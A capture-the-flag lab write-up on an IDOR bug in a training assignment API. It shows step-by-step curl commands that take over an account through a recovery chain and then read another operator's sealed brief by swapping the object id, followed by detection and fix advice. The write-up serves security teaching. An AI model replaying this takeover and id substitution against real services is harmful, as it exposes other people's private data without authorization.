# T02.4 — Someone else's assignment

> **Category:** 1. Training · **Points:** 100 · **Difficulty:** medium
> **Solved by:** me (manual)

## At a glance

| | |
|---|---|
| **Vulnerability / bug class** | IDOR / missing object-level authorization — the assignment brief route authenticates the session but never checks that the assignment belongs to the caller |
| **Tools** | `curl`, `jq` |
| **Attack surface** | `GET http://accounts.training:8080/api/assignments` and `GET /api/assignments/{id}/brief` (10.77.40.30) |
| **Prerequisite** | A valid rehearsal session for `rhea.moss` (from T02.3) |
| **Flag** | `FLAG{50676f831e62140a}` |

**What you are about to read:** the classic broken-object-level-authorization pattern:
a list endpoint scoped honestly to the caller, a detail endpoint that accepts any id, and a
hint — `paired_assignment_id` — that hands you the id worth asking for. One identifier
replaced is all the exploit there is; the lesson is where the check has to live.

## Objective

> From the recovered account, use the assignment service to obtain another operator's
> sealed rehearsal brief.

`rhea.moss` has a receiving assignment; `dax.hale` has the dispatch half of the same
rehearsal. Both are described in rhea's own handover, which names the pairing. The card is
about whether the brief route honours that boundary or only the session.

## Background you need

- **Authentication vs authorization, again.** The endpoint checks *who you are* (a valid
  `CINDER_REHEARSAL_SESSION` for `rhea.moss`) and stops there. It never asks whether *this
  object* is one rhea may read. That is IDOR: the id in the URL is the authorization
  decision.
- **Sequential identifiers make it trivial.** `ASG-204`, `ASG-317` — the reference is
  guessable, and worse, it is returned by the caller's own list endpoint as
  `paired_assignment_id`.
- **"Sealed" briefs are still files.** A record described as sealed is sealed only by the
  access rule in front of it. If the rule is absent, the seal is decorative.
- **Why it is rated medium.** The technique is one substitution, but it needs the full
  recon→takeover chain (T02.1→T02.3) before there is any session to abuse, and the
  distinction between a scoped list and an unscoped detail is where most real-world
  authorization bugs live.

## Walkthrough

### 1. Recon — the authenticated surface

With the session from the recovery takeover:

```bash
H=http://accounts.training:8080
S='CINDER_REHEARSAL_SESSION=…'          # cookie jar from /api/recovery/redeem
curl -sS -b /tmp/rhea.jar $H/api/assignments | jq .
```

```json
{
  "assignments": [
    {"assignment_id": "ASG-204", "owner": "rhea.moss",
     "paired_assignment_id": "ASG-317", "revision": 3,
     "area": "Bay 4 receiving"}
  ]
}
```

The list is correctly scoped: one assignment, the caller's own. But it volunteers the
counterpart's identifier — the desk *wants* the two halves of the rehearsal correlated, so it
exposes the pairing in the data model.

`GET /api/handover` (the private handover from T02.3) says the same thing in prose and points
at the detail route:

```
GET /api/assignments/{id}/brief
```

### 2. Finding the flaw — the brief route takes any id

Read your own brief first; this is the control case:

```bash
curl -sS -b /tmp/rhea.jar $H/api/assignments/ASG-204/brief
```

```
Receive three sealed parcels from CR-17 and retain the manifest audit.
```

Then substitute the paired identifier — no other change:

```bash
curl -sS -i -b /tmp/rhea.jar $H/api/assignments/ASG-317/brief
```

```json
{"assignment_id": "ASG-317", "owner": "dax.hale",
 "brief": "Release DL-204 only after the Bay 4 courier and seal values agree.",
 "flag": "FLAG{50676f831e62140a}"}
```

`200` with another operator's content. The response even states `owner: dax.hale`, which is
the proof that the server knows who owns the object and did not compare it with the session
subject.

### 3. Exploitation — the whole chain in six requests

For the record, the entire path from nothing to another operator's brief:

```bash
H=http://accounts.training:8080

# T02.1 — enumerate the published candidates, keep the active one
curl -sS -H 'Content-Type: application/json' -d '{"account":"rhea.moss"}' \
     $H/api/recovery/lookup

# T02.2 — the hidden directory record supplies the second recovery input
curl -sS $H/api/directory/staff/STF-204/assignment

# T02.3 — redeem both values for a session
curl -sS -c /tmp/rhea.jar -H 'Content-Type: application/json' \
     -d '{"account":"rhea.moss","case_fragment":"CASE-7Q4M","staff_detail":"Blue cabinet 17"}' \
     $H/api/recovery/redeem

# T02.4 — read the paired (dispatch) assignment as rhea
curl -sS -b /tmp/rhea.jar $H/api/assignments/ASG-317/brief
```

Nothing in the last step is an exploit primitive: it is a plain `GET` with a valid session.
That is what makes IDOR dangerous — the bug is the *absence* of code, so there is no payload
to detect.

### 4. Getting the flag

The flag arrives in the stolen brief:

```json
{"assignment_id": "ASG-317", "owner": "dax.hale",
 "brief": "Release DL-204 only after the Bay 4 courier and seal values agree.",
 "flag": "FLAG{50676f831e62140a}"}
```

`FLAG{50676f831e62140a}` — accepted on the third global attempt (first correct submission by
this lane). The brief also names the next desk: delivery `DL-204`, courier `CR-17`, and
"seal values" — the workbench/courier cards (`T01.x`) work on the same delivery.

## Why this works (the vulnerability explained)

The service makes the decision at the wrong granularity. It classifies routes as
"authenticated" and "anonymous", applies a session check to the former, and never asks the
question that object-level authorization requires:

```
may( subject = session.subject , action = "read" , object = /api/assignments/ASG-317 )
```

The list endpoint answers a *scoped query* (`WHERE owner = session.subject`), which looks like
authorization but is really filtering — the same mistake as T02.2, one layer deeper. The
detail endpoint answers a *lookup by primary key* and returns whatever it finds. Anyone with
any valid session can address any object.

Three things make this the archetypal IDOR rather than a theoretical one:

1. **Identifiers are sequential** (`ASG-204`, `ASG-317`), so the space is trivial even without
   the pairing hint.
2. **The system advertises the target.** `paired_assignment_id` in the caller's own record
   hands over the exact id — the attack needs no enumeration at all.
3. **The response states the owner.** The server had `dax.hale` in hand and still returned
   the record to a `rhea.moss` session.

Correct design: authorize every object read against the session subject (or an explicit
relationship: owner, delegate, paired-reviewer), do it in the data layer so no route can
forget, and use unguessable identifiers as defence in depth — never as the control.

## Detection and fix

- **Detection:** a single session requesting two assignment ids it does not own in sequence;
  `200`s where `object.owner != session.subject` (log both, alert on the mismatch); access to
  a `paired_assignment_id` that the caller has no delegation for. Because there is no
  payload, request-pattern detection is the only network-level signal — the reliable
  control is an authorization assert in code.
- **Fix:** add the ownership predicate to the brief route
  (`WHERE id = ? AND owner = ?`), or model the pairing as an explicit grant if a coordinator
  is genuinely allowed to read both halves. Apply it centrally (middleware/policy layer) so
  new routes cannot omit it, and add a test that a second user's session gets `403`/`404` for
  every object route. Return `404` rather than `403` for other users' objects, so the API
  does not confirm their existence.

## Notes and dead ends

- Values above are from the identity-desk lane artifacts: the `/api/assignments` list, the
  `ASG-204` brief text, the `ASG-317` brief with `owner: dax.hale`, and the flag. The
  assignment JSON is trimmed to the fields relevant here.
- The paired id is genuinely useful reconnaissance, not just a shortcut: it names
  `dax.hale` as dispatch owner and ties the rehearsal to `DL-204`, which is the delivery the
  workbench/courier cards use. Follow that reference rather than guessing ids.
- `dax.hale` has no session of his own on this desk (no recovery path was found for him), so
  "log in as the owner" is not an alternative route; the IDOR is the only way to the dispatch
  brief.
- Do not re-run the recovery redeem for `rhea.moss`: it is a state-changing, one-time action.
  The session stays valid and is all T02.4 needs. Blind id enumeration across `ASG-*` is also
  unnecessary here — the correct identifier is published in the caller's own record.
